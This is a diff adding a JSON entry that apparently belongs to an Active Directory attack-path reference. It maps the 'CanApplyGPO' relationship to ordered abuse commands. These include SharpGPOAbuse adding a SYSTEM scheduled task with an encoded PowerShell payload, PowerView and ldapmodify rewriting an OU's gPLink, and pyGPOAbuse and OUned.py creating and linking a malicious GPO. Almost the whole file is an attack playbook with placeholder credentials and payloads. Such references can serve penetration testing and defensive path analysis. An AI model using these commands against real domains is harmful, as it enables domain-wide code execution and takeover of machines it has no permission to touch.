@@ -1,0 +1,97 @@
+{
+    "CanApplyGPO": {
+        "meaning": "The CanApplyGPO relationship connects an AD principal to an AD account (user or computer) that the principal can apply a Group Policy Object (GPO) to. This edge is created when the principal has write access to the gPLink attribute of the domain or organizational unit (OU) containing the account, allowing them to link a GPO that will affect the target.",
+        "common": "",
+        "windows": {
+            "SharpGPOAbuse": [
+                {
+                    "order": 1,
+                    "command": "SharpGPOAbuse.exe --AddComputerTask --TaskName \"EvilTask\" --Author NT\\ AUTHORITY\\SYSTEM --Command \"cmd.exe\" --Arguments \"/c powershell.exe -enc <base64_payload>\" --GPOName \"TARGET_GPO\"",
+                    "description": "Add malicious scheduled task to GPO using SharpGPOAbuse"
+                },
+                {
+                    "order": 2,
+                    "command": "gpupdate /force",
+                    "description": "Force Group Policy update to apply malicious GPO immediately"
+                }
+            ],
+            "PowerView_Powermad": [
+                {
+                    "order": 1,
+                    "command": "New-MachineAccount -MachineAccount FAKE_DC -Password $(ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)",
+                    "description": "Create machine account for fake LDAP server using Powermad"
+                },
+                {
+                    "order": 2,
+                    "command": "Set-DomainObject -Identity 'CN=TARGET_OU,DC=domain,DC=com' -Set @{'gPLink'='[LDAP://cn={GUID},cn=policies,cn=system,DC=domain,DC=com;0]'} -Verbose",
+                    "description": "Modify gPLink attribute to link malicious GPO using PowerView"
+                },
+                {
+                    "order": 3,
+                    "command": "# Setup fake LDAP server hosting malicious GPO content",
+                    "description": "Configure fake LDAP server to serve malicious Group Policy content"
+                }
+            ],
+            "Native_Windows": [
+                {
+                    "order": 1,
+                    "command": "# Create malicious GPO content with scheduled task or startup script",
+                    "description": "Prepare malicious Group Policy configuration"
+                },
+                {
+                    "order": 2,
+                    "command": "gpmc.msc",
+                    "description": "Open Group Policy Management Console (if GUI access available)"
+                },
+                {
+                    "order": 3,
+                    "command": "# Link malicious GPO to target OU through GPMC interface",
+                    "description": "Use GPMC to link GPO to organizational unit containing target accounts"
+                }
+            ]
+        },
+        "linux": {
+            "pyGPOAbuse": [
+                {
+                    "order": 1,
+                    "command": "python3 pyGPOAbuse.py DOMAIN/user:password -dc-ip DC_IP -command-type scheduled_task -command \"powershell.exe -enc <base64_payload>\" -gpo-id \"{GUID}\"",
+                    "description": "Create malicious GPO with scheduled task using pyGPOAbuse"
+                },
+                {
+                    "order": 2,
+                    "command": "python3 pyGPOAbuse.py DOMAIN/user:password -dc-ip DC_IP -link-gpo \"{GUID}\" -target-ou \"OU=TARGET,DC=domain,DC=com\"",
+                    "description": "Link malicious GPO to target organizational unit"
+                }
+            ],
+            "OUned_py": [
+                {
+                    "order": 1,
+                    "command": "python3 OUned.py -u user@domain.com -p password -d domain.com -dc-ip DC_IP --target-ou \"OU=TARGET,DC=domain,DC=com\"",
+                    "description": "Exploit OU ACL to link malicious GPO using OUned.py"
+                },
+                {
+                    "order": 2,
+                    "command": "python3 OUned.py -u user@domain.com -p password -d domain.com -dc-ip DC_IP --create-gpo --gpo-name \"MaliciousGPO\" --command \"cmd /c powershell.exe -enc <payload>\"",
+                    "description": "Create and deploy malicious GPO with custom payload"
+                }
+            ],
+            "Manual_LDAP": [
+                {
+                    "order": 1,
+                    "command": "ldapsearch -x -D 'CN=user,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -b 'OU=TARGET,DC=domain,DC=com' gPLink",
+                    "description": "Query current gPLink attribute of target organizational unit"
+                },
+                {
+                    "order": 2,
+                    "command": "echo -e 'dn: OU=TARGET,DC=domain,DC=com\\nchangetype: modify\\nreplace: gPLink\\ngPLink: [LDAP://cn={MALICIOUS_GUID},cn=policies,cn=system,DC=domain,DC=com;0]' | ldapmodify -x -D 'CN=user,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com",
+                    "description": "Modify gPLink attribute to include malicious GPO using LDAP"
+                },
+                {
+                    "order": 3,
+                    "command": "# Setup fake LDAP server or create legitimate GPO with malicious content",
+                    "description": "Deploy malicious Group Policy content via fake LDAP server or legitimate GPO"
+                }
+            ]
+        }
+    }
+}
